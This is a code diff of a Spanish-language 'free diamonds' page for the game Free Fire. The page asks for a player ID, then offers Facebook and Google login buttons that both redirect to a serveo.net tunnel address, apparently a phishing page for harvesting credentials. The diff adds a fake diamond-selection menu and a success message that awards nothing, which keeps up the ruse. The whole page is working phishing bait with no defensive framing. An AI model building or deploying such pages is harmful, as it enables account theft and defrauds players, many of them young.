@@ -5,36 +5,45 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Regalador de Diamantes</title>
     <style>
-        /* Fondo RGB animado */
+        /* Estilo del fondo con animación eléctrica RGB */
         body {
             margin: 0;
             padding: 0;
-            height: 100vh;
-            background: linear-gradient(45deg, rgba(255,0,0,0.7), rgba(0,255,255,0.7), rgba(0,0,255,0.7), rgba(0,255,0,0.7));
-            background-size: 400% 400%;
-            animation: gradientAnimation 6s ease infinite;
             font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff, #ff00ff);
+            background-size: 400% 400%;
+            animation: gradientAnimation 5s ease infinite;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             color: white;
-            overflow: hidden;
         }
 
-        /* Animación del fondo RGB */
+        /* Definimos el efecto de animación para el fondo */
         @keyframes gradientAnimation {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
         }
 
         .container {
             text-align: center;
-            background-color: rgba(0, 0, 0, 0.6); /* Fondo oscuro para que el texto resalte */
-            padding: 20px;
-            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.7); /* Fondo oscuro para mejorar la visibilidad del texto */
+            padding: 30px;
+            border-radius: 15px;
             width: 350px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.7); /* Efecto de sombra para dar un toque luminoso */
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
         }
 
         .input-container {
@@ -48,7 +57,8 @@
             border: none;
             border-radius: 5px;
             margin-right: 10px;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8); /* Brillo en los campos de texto */
+            background-color: #444;
+            color: white;
         }
 
         .btn-submit {
@@ -58,12 +68,10 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8); /* Brillo en el botón */
         }
 
         .btn-submit:hover {
             background-color: #e68a00;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 1); /* Aumentar brillo al pasar el mouse */
         }
 
         .login-options {
@@ -78,7 +86,6 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
         }
 
         .facebook {
@@ -93,22 +100,61 @@
 
         .login-button:hover {
             opacity: 0.8;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 1);
         }
 
+        .diamond-selection {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .diamond-option {
+            margin: 10px;
+            padding: 10px;
+            font-size: 16px;
+            background-color: #ff9900;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .diamond-option:hover {
+            background-color: #e68a00;
+        }
+
+        .success-message {
+            display: none;
+            font-size: 20px;
+            margin-top: 20px;
+            color: #28a745;
+        }
+
+        .success-icon {
+            margin-left: 10px;
+            color: #28a745;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Bienvenido al Regalador de Diamantes</h1>
         <div class="input-container">
-            <input type="text" id="userID" placeholder="Ingresa tu ID De Free Fire" />
+            <input type="text" id="userID" placeholder="Ingresa tu ID" />
             <button class="btn-submit" onclick="checkID()">Enviar</button>
         </div>
         <div class="login-options" id="loginOptions">
             <p>Inicia sesión con tu cuenta FREE:</p>
-            <button class="login-button facebook" onclick="redirectToFacebook()">Iniciar sesión con Facebook</button>
-            <button class="login-button google" onclick="redirectToGoogle()">Iniciar sesión con Google</button>
+            <button class="login-button facebook" onclick="redirectToLogin('facebook')">Iniciar sesión con Facebook</button>
+            <button class="login-button google" onclick="redirectToLogin('google')">Iniciar sesión con Google</button>
+        </div>
+        <div class="diamond-selection" id="diamondSelection">
+            <p>Selecciona la cantidad de diamantes:</p>
+            <button class="diamond-option" onclick="selectDiamonds(100)">100 Diamantes</button>
+            <button class="diamond-option" onclick="selectDiamonds(310)">310 Diamantes</button>
+            <button class="diamond-option" onclick="selectDiamonds(520)">520 Diamantes</button>
+            <button class="diamond-option" onclick="selectDiamonds(1080)">1080 Diamantes</button>
+        </div>
+        <div class="success-message" id="successMessage">
+            <span>Enviados exitosamente</span><span class="success-icon">✔️</span>
         </div>
     </div>
 
@@ -123,13 +169,37 @@
             }
         }
 
-        function redirectToFacebook() {
-            window.location.href = "https://fe86a13e3fc028b118038584a734a49a.serveo.net";
+        function redirectToLogin(platform) {
+            // Redirigir al enlace de autenticación
+            window.location.href = "https://90adf01ecde8774baec347312e45bb5a.serveo.net";
+            // Después de redirigir, esperamos que el servidor maneje la autenticación
+            // Simulamos el regreso a la página con la autenticación exitosa
+            setTimeout(function() {
+                // Una vez autenticado, mostramos la selección de diamantes
+                document.getElementById("diamondSelection").style.display = "block";
+            }, 2000);  // Retraso para simular que el proceso de autenticación está ocurriendo
         }
 
-        function redirectToGoogle() {
-            window.location.href = "https://fe86a13e3fc028b118038584a734a49a.serveo.net";
+        function selectDiamonds(diamonds) {
+            // Ocultar la selección de diamantes
+            document.getElementById("diamondSelection").style.display = "none";
+            // Mostrar mensaje de éxito con chulito
+            document.getElementById("successMessage").style.display = "block";
+
+            // Recargar la página después de 5 segundos
+            setTimeout(function() {
+                location.reload();
+            }, 5000);  // Recarga la página después de 5 segundos
         }
+
+        // Verificación del parámetro "authenticated" en la URL para mostrar las opciones de diamantes
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('authenticated')) {
+                // Si el usuario está autenticado (viene de Serveo), mostramos la selección de diamantes
+                document.getElementById("diamondSelection").style.display = "block";
+            }
+        };
     </script>
 </body>
 </html>
